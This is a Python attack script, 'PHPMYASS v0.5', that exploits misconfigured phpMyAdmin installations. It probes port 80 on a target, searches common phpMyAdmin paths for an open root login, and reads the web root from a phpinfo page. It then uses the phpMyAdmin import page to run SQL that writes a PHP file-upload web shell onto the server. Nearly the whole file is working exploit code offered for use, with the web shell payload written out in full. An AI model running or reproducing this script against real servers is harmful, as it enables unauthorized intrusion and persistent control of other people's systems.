#!/usr/bin/python
###################################################################################################
#
#       _/_/_/_/_/    _/  _/_/_/  _/     _/ _/    _/ _/_/_/_/ _/_/_/_/ _/_/_/_/
#      _/   _/ _/    _/  _/   _/ _/_/ _/_/  _/ _/  _/     _/  _/       _/
#     _/_/_/  _/_/_/_/  _/_/_/  _/  _/ _/   _/    _/_/_/ _/    _/_/     _/_/
#    _/      _/    _/  _/      _/     _/   _/    _/     _/        _/       _/
#   _/      _/    _/  _/      _/     _/   _/    _/     _/ _/_/_/_/ _/_/_/_/
#
# v0.5
# PHPMYASS | A LESSON IN SERVER MISCONFIGURATION | FIZZLE STICK (Professor)
# TESTED AGAINST: WINDOWS W/ UWAMP, XAMPP
# workFLOW: discover, inject, validate, report.....  
# "what does this do?"....
# - this is designed to leverage misconfigured phpmyadmin installations with auth=config.
# - the process is agnostic, and can have sexy time with both windows or linux in theory.
# - We look for the open page, find some crap we need, clean it up, and then create an PHP shell.
# - currently the result is an upload shell.
###################################################################################################

# IMPORTANT STUFF
import urllib
import mechanize
import logging
from re import findall
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb=0

#browser
br = mechanize.Browser()

# phpmyadmin directory list
mylist = [
'/phpmyadmin/',
'/phpMyAdmin/',
'/mysql/',
'/pma/',
'/PMA/',
'/admin/',
'/dbadmin/',
'/sqlmanager/',
'/sqlweb/'
'/websql/',
'/mysqladmin/']

# phpinfo target list
mylist2 = [
'/phpinfo.php',
'/xampp/phpinfo.php',
'/somedir/phpinfo.php']

# PROBE FUNCTION ... SYN 80 to target
def probe(host):
	myprobe = (IP(dst=host)/TCP(dport=80,flags="S"))
	derp = sr1(myprobe, timeout=1)
	try:
		derpy = derp.summary()
		if derpy.find('SA') != -1:
			print "[PORT80: ]\tOPEN - GOT SYN/ACK from target ;D"
		elif derpy.find('RA') != -1:
			print "[PORT80: ]\tclosed - sucks,might as well quit here."
			#end
	except:
		print "[PORT:  ]\t\tfiltered - looks like its blocked or not accessible"

# CHECKROOT FUNCTION ... did you leave the config open?
def checkroot(host):
	for dir in mylist:	
		try:
			openmya = br.open('http://'+host+dir)
			if openmya.code == 200:
				print '[PMADIR: ]\tFOUND at this location > '+dir
				global goodcrap2				
				goodcrap2 = dir
				disc1 = openmya.read()
				break #found our stuff, loop out
		except:
				pass
	if disc1.find('root@localhost') != -1:
		print "[OPNROOT:]\tFOUND!!!.... root@localhost string.. onto the next level!!"
	else:
		print "[OPNROOT:]\tnot found... straight up open root not found."

# WWWFINDER FUNCTION ... can we find the wwwroot on the file sys...
def wwwfind(host):
	for nfowww in mylist2:	
		try:
			nfofind = br.open('http://'+host+nfowww)
			if nfofind.code == 200:
				phpresp= nfofind.read()
				print '[PHPNFO: ]\tFOUND!!!.... at this location > ', nfowww
				phpresp.count('DOCUMENT_ROOT')
				somedata = findall('DOCUMENT_ROOT +[\D]+[</td><td class="v">]', phpresp)
				nig = str(somedata)
				len(nig)
				frack = nig.replace('[\'DOCUMENT_ROOT </td><td class="v">', '')
				nerd = str.split(frack)
				wwwdir = nerd[0]
				print '[WWWroot:]\tFOUND!!!....at this location > ', wwwdir
				#build payload
				mystring = 'CREATE TABLE `phpmyadmin`.`newnew` ( `track2` VARCHAR( 1000 ) NOT NULL ) ENGINE = MYISAM ; INSERT INTO newnew VALUES ("<?php echo \'<form enctype=multipart/form-data action=up.php method=POST> <input type=hidden name=MAX_FILE_SIZE value=100000 /> <input name=uploadedfile type=file /><br /><input type=submit value=Upload File /></form>\'; move_uploaded_file($_FILES[uploadedfile][tmp_name], basename( $_FILES[uploadedfile][name]));?> ");select * into dumpfile \''+wwwdir+'/up.php\' from newnew;'
				text_file = open("newnew.sql", "w")
				text_file.write(mystring)
				text_file.close()
				print '[PAYLOAD:]\t......used WWWroot to create payload!  werd.'
				break #breakout
		except:
				#sprint 'phpinfopage not found at ', nfowww
				pass

# HITDB FUNCTION ... weve come this far, lets hit the DB.
def hitdb(host):
	openmya = br.open('http://'+host+goodcrap2)
	new_link = br.click_link(text='phpmyadmin')
	hitderp1 = br.open(new_link)
	indb = hitderp1.read()
	try:
		if indb.find('import.php') != -1:
			print "[IMPORT: ]\tFOUND!! ... AWESOME, moving right along! ;D"
		else:
			print "[IMPORT: ]\tnot found... well shit, my brain ends here."
	except:
		print "[IMPORT:  ]\t....unknown quiting!"
	new_link2 = br.click_link(text='Import[IMG] Import')
	hitderp2 = br.open(new_link2)
	indb2 = hitderp2.read()
	br.select_form(nr=1)
	filename = 'newnew.sql'
	br.form.add_file(open(filename), 'text/plain', filename)
	br.form.set_all_readonly(False)
	br.submit()
	print "[PAYLOAD:]\t....SENT!!!!!!!"
	upurl = ('http://'+host+'/up.php')
	upchuck = urllib.urlopen(upurl)
	try:
		if upchuck.code == 200:
			print '[RESULT: ]\tYOU WIN!!#@!%^$#@!    browse to http://'+host+'/up.php'
		else:
			print '[RESULT: ]\tyou lose.....SOMETHING WENT WRONG.... all that work.. run cleanup?'
	except:
		print "[RESULT: ]\t....unknown quiting!....BUMMER..so close!"

# TAKE A TRAIN TO CHARLIE SHEENVILLE ... POP.   #WINNING.....
print '=====================================[ PHPMYASS v0.5 ] ==[ fizzle ]======'
host = raw_input('What is the target host? >> ')
probe(host)
checkroot(host)
wwwfind(host)
hitdb(host)
print '=========================================================================='
